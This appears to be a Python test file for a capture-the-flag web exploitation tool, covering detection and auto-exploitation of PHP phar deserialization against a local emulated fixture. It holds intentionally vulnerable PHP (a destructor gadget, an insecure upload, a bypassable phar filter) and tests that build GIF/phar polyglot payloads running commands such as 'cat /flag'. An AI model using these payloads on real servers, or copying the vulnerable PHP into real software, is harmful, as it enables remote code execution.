"""Tests for PHP phar-deserialization detection and the auto-exploit.

The end-to-end test uses a Python fixture that *emulates* PHP's phar+POP behaviour
(no PHP needed in CI). The real phar byte format is validated separately against a
live PHP target during development; here we prove detection, gadget extraction,
the phar/serializer builders, and the full craft->upload->trigger->flag pipeline.
"""
import os
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from webctf.analyzers import analyze  # noqa: E402
from webctf.analyzers.php_analysis import find_pop_gadgets, php_targets  # noqa: E402
from webctf.core.config import RunConfig  # noqa: E402
from webctf.core.engine import run  # noqa: E402
from webctf.exploits.phar import build_phar, php_serialize_object  # noqa: E402
from fixtures.server import ServedApp  # noqa: E402
from fixtures import phar_upload  # noqa: E402

CONTACT_PHP = """<?php
class Contact {
    public $p1 = 'a'; public $p2 = 'b'; public $p3 = 'c';
    function __destruct() { ($this->p1)($this->p2, $this->p3); }
}
"""
INDEX_PHP = """<?php
require("contact.php");
if (isset($_POST["submit"])) {
    $scheme = $_POST["scheme"];
    $name = $_FILES["gifimage"]["name"];
    $target = "uploads/" . $name;
    move_uploaded_file($_FILES["gifimage"]["tmp_name"], $target);
    if (preg_match('/phar:\\/\\//', $scheme)) { echo "No phar"; }
    $target = $scheme . $target;
    if (file_exists(strtolower($target))) { echo "ok"; }
}
"""


def _source_zip(tmp):
    z = Path(tmp) / "dist.tar.zip"
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("src/contact.php", CONTACT_PHP)
        zf.writestr("src/index.php", INDEX_PHP)
    return str(z)


class PharBuilderTests(unittest.TestCase):
    def test_php_serialize(self):
        s = php_serialize_object("Contact", {"p1": "system", "p2": "id", "p3": ""})
        self.assertEqual(
            s, 'O:7:"Contact":3:{s:2:"p1";s:6:"system";s:2:"p2";s:2:"id";s:2:"p3";s:0:"";}')

    def test_build_phar_shape(self):
        meta = php_serialize_object("Contact", {"p1": "system", "p2": "cat /flag", "p3": ""})
        blob = build_phar(meta)
        self.assertTrue(blob.startswith(b"GIF89a"))          # polyglot gif magic
        self.assertIn(b"__HALT_COMPILER();", blob)           # phar stub
        self.assertIn(meta.encode(), blob)                   # gadget metadata embedded
        self.assertTrue(blob.endswith(b"GBMB"))              # phar signature magic


class PhpDetectionTests(unittest.TestCase):
    def test_pop_gadget_extraction(self):
        gs = find_pop_gadgets(CONTACT_PHP)
        self.assertEqual(len(gs), 1)
        self.assertEqual(gs[0]["class"], "Contact")
        self.assertEqual(gs[0]["runner"], "p1")
        self.assertEqual(gs[0]["args"], ["p2", "p3"])

    def test_targets_and_findings(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = analyze(_source_zip(tmp))
        php = result.metadata["php"]
        self.assertTrue(php["exploitable"])
        self.assertEqual(php["upload_fields"], ["gifimage"])
        self.assertIn("scheme", php["post_fields"])
        cats = {f.category for f in result.findings}
        self.assertIn("PHP POP gadget (magic method dynamic call)", cats)
        self.assertIn("Insecure file upload", cats)
        self.assertIn("Weak phar:// filter (bypassable)", cats)


class PharExploitTests(unittest.TestCase):
    def test_end_to_end_auto_solve(self):
        with tempfile.TemporaryDirectory() as tmp:
            src = _source_zip(tmp)
            with ServedApp(phar_upload.make_app("ARENA{tool_phar_win}")) as s:
                result = run(s.url, RunConfig(active=True, solve=True, delay=0,
                                              enum_paths=False, max_pages=6, max_tests=150),
                             source=src)
        best = result.best_flag()
        self.assertIsNotNone(best, "no flag recovered")
        self.assertTrue(best.verified)
        self.assertEqual(best.value, "ARENA{tool_phar_win}")
        self.assertTrue(any(f.category == "PHAR deserialization -> RCE" for f in result.findings))

    def test_requires_source_gadget(self):
        # No source -> no gadget -> exploit must not fire (and no false flag).
        with ServedApp(phar_upload.make_app("ARENA{should_not_leak}")) as s:
            result = run(s.url, RunConfig(active=True, solve=True, delay=0,
                                          enum_paths=False, max_pages=4, max_tests=60))
        self.assertFalse(any(f.category == "PHAR deserialization -> RCE" for f in result.findings))


if __name__ == "__main__":
    unittest.main()
